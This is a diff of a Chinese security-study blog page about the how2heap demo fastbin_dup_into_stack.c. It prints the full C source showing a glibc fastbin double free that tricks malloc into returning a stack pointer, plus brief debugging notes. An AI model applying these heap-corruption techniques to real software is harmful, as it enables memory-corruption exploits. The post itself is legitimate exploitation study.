@@ -80,25 +80,23 @@
 <meta name="description" content="how2heap 调试记录">
 <meta name="keywords" content="studying,daily,pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="how2heap-two">
-<meta property="og:url" content="http://yoursite.com/2018/05/14/12/index.html">
+<meta property="og:title" content="how2heap-three">
+<meta property="og:url" content="http://yoursite.com/2018/05/15/14/index.html">
 <meta property="og:site_name" content="Lookup&#39;s blog">
 <meta property="og:description" content="how2heap 调试记录">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frb87emdw9j30oq01vjrb.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frb92kdncdj30q2076myn.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frb8h7s22dj30qd02oweo.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frb8i7gwbgj30co056dg5.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frb8kxa047j30q602idg0.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frb8ljzl4hj30cg05adg7.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frb8pusqnqj30q502oglt.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frb8r5dshmj30dt05bmxy.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frb8tnllusj30q102maa9.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frb8t534gej30o4059ab2.jpg">
-<meta property="og:updated_time" content="2018-05-14T14:46:20.758Z">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frcctuo945j30oq01sdfu.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frcd17um7lj30tg0bcdil.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frcdgmq0n0j30qi02r0sz.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frcdfk7tz8j30o6057jse.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frce7hyp6nj30q602mq36.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frce6mtftej30l2056dgr.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frce9628inj30q602ljrl.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frce88atspj30fo059js8.jpg">
+<meta property="og:updated_time" content="2018-05-15T14:50:30.348Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="how2heap-two">
+<meta name="twitter:title" content="how2heap-three">
 <meta name="twitter:description" content="how2heap 调试记录">
-<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frb87emdw9j30oq01vjrb.jpg">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006wmzAzly1frcctuo945j30oq01sdfu.jpg">
 
 
 
@@ -116,7 +114,7 @@
   };
 </script>
 
-  <title> how2heap-two | Lookup's blog </title>
+  <title> how2heap-three | Lookup's blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -279,7 +277,7 @@
             
             
               
-                how2heap-two
+                how2heap-three
               
             
           </h1>
@@ -291,8 +289,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2018-05-14T22:13:02+08:00" content="2018-05-14">
-              2018-05-14
+            <time itemprop="dateCreated" datetime="2018-05-15T21:33:02+08:00" content="2018-05-15">
+              2018-05-15
             </time>
           </span>
 
@@ -366,40 +364,33 @@
 <p><excerpt in="" index="" |="" 首页摘要=""><br> <a id="more"></a></excerpt></p>
 <the rest="" of="" contents="" |="" 余下全文="">
 
-<h3 id="fastbin-dup-c"><a href="#fastbin-dup-c" class="headerlink" title="fastbin_dup.c"></a>fastbin_dup.c</h3><p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frb87emdw9j30oq01vjrb.jpg" alt=""></p>
+<h3 id="fastbin-dup-into-stack-c"><a href="#fastbin-dup-into-stack-c" class="headerlink" title="fastbin_dup_into_stack.c"></a>fastbin_dup_into_stack.c</h3><p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frcctuo945j30oq01sdfu.jpg" alt=""></p>
 <blockquote>
-<p>滥用 fastbin freelist 导致 malloc 返回了已经分配的堆指针</p>
+<p>大概意思是，通过滥用 fastbin freelist 来促使malloc返回一个几乎任意的指针。</p>
 </blockquote>
-<h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</div><div class="line"></div><div class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</div><div class="line"></div><div class="line">	<span class="built_in">free</span>(a);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</div><div class="line">	<span class="comment">// free(a);</span></div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</div><div class="line"></div><div class="line">	<span class="built_in">free</span>(b);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</div><div class="line"></div><div class="line">	<span class="built_in">free</span>(a);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></div><div class="line">	       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</div><div class="line"></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The address we want malloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</div><div class="line"></div><div class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</div><div class="line"></div><div class="line">	<span class="built_in">free</span>(a);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</div><div class="line">	<span class="comment">// free(a);</span></div><div class="line"></div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</div><div class="line"></div><div class="line">	<span class="built_in">free</span>(b);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</div><div class="line"></div><div class="line">	<span class="built_in">free</span>(a);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. "</span></div><div class="line">		<span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</div><div class="line"></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, d);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></div><div class="line">		<span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></div><div class="line">		<span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></div><div class="line">		<span class="string">"return a pointer to it.\n"</span>, a);</div><div class="line"></div><div class="line">	stack_var = <span class="number">0x20</span>;</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</div><div class="line"></div><div class="line">	*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</div><div class="line"></div><div class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><blockquote>
-<p>运行执行结果如下</p>
+<p>执行情况：</p>
 </blockquote>
-<p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frb92kdncdj30q2076myn.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frcd17um7lj30tg0bcdil.jpg" alt=""></p>
 <blockquote>
-<p>程序首先申请了 3 块大小为 8bytes 的内存给 a、b、c。</p>
-<p>这时的 heap 情况</p>
+<p>程序首先定义了一个 stack_var ,并打印出了他的地址 +8 的结果为 0x7fffffffde58。</p>
+<p>然后程序 malloc 申请了 3 个大小为 8 的 chunk。然后接下来的过程与上一个分析一模一样，这里就不分析了。</p>
 </blockquote>
-<p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frb8h7s22dj30qd02oweo.jpg" alt=""> </p>
-<p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frb8i7gwbgj30co056dg5.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frcdgmq0n0j30qi02r0sz.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frcdfk7tz8j30o6057jse.jpg" alt=""></p>
 <blockquote>
-<p>接着程序将 a free 掉了。</p>
+<p>然后定义了个指针 d 给他返回了 malloc(8) 的地址，其实就是 free 掉的 a 的地址。然后又 malloc(8) ,这时返回 free 掉的 b 的地址。</p>
+<p>然后再给 stack_var 赋值 0x20。再修改掉 d 的值。</p>
 </blockquote>
-<p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frb8kxa047j30q602idg0.jpg" alt=""></p>
-<p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frb8ljzl4hj30cg05adg7.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frce7hyp6nj30q602mq36.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frce6mtftej30l2056dgr.jpg" alt=""></p>
 <blockquote>
-<p>接着程序将 b free 掉了。</p>
+<p>然后在进行两次 malloc 便可获得 0x7fffffffde58</p>
 </blockquote>
-<p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frb8pusqnqj30q502oglt.jpg" alt=""></p>
-<p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frb8r5dshmj30dt05bmxy.jpg" alt=""></p>
-<blockquote>
-<p>这里到了关键程序再次将 a free 掉了。</p>
-</blockquote>
-<p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frb8tnllusj30q102maa9.jpg" alt=""></p>
-<p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frb8t534gej30o4059ab2.jpg" alt=""></p>
-<blockquote>
-<p>我们可以明显看到，fastbin 中形成了 0x602000 –&gt; 0x602020 –&gt; 0x602000 的循环。而这也导致我们再进行相同的地址申请，打印出的地址重复申请了 0x602000。</p>
-<p><strong>结论</strong>: 通过 fastbins 中的 double free ，我们可以得到一块堆块的指针。</p>
-</blockquote>
+<p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frce9628inj30q602ljrl.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/006wmzAzly1frce88atspj30fo059js8.jpg" alt=""></p>
+<p><strong>注</strong>: 这我个人还是有点不理解，等我问完大神后，在来进行修改。</p>
 </the>
       
     </div>
@@ -434,16 +425,16 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/05/14/11/" rel="next" title="Heap-exploitation-four">
-                <i class="fa fa-chevron-left"></i> Heap-exploitation-four
+              <a href="/2018/05/15/13/" rel="next" title="Heap-exploitation-five">
+                <i class="fa fa-chevron-left"></i> Heap-exploitation-five
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/05/15/13/" rel="prev" title="Heap-exploitation-five">
-                Heap-exploitation-five <i class="fa fa-chevron-right"></i>
+              <a href="/2088/04/02/6/" rel="prev" title="Lookup's Daily">
+                Lookup's Daily <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -595,7 +586,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-dup-c"><span class="nav-number">1.</span> <span class="nav-text">fastbin_dup.c</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#源码"><span class="nav-number">1.1.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析"><span class="nav-number">1.2.</span> <span class="nav-text">分析</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-dup-into-stack-c"><span class="nav-number">1.</span> <span class="nav-text">fastbin_dup_into_stack.c</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#源码"><span class="nav-number">1.1.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析"><span class="nav-number">1.2.</span> <span class="nav-text">分析</span></a></li></ol></li></ol></div>
             
           </div>
         </section>
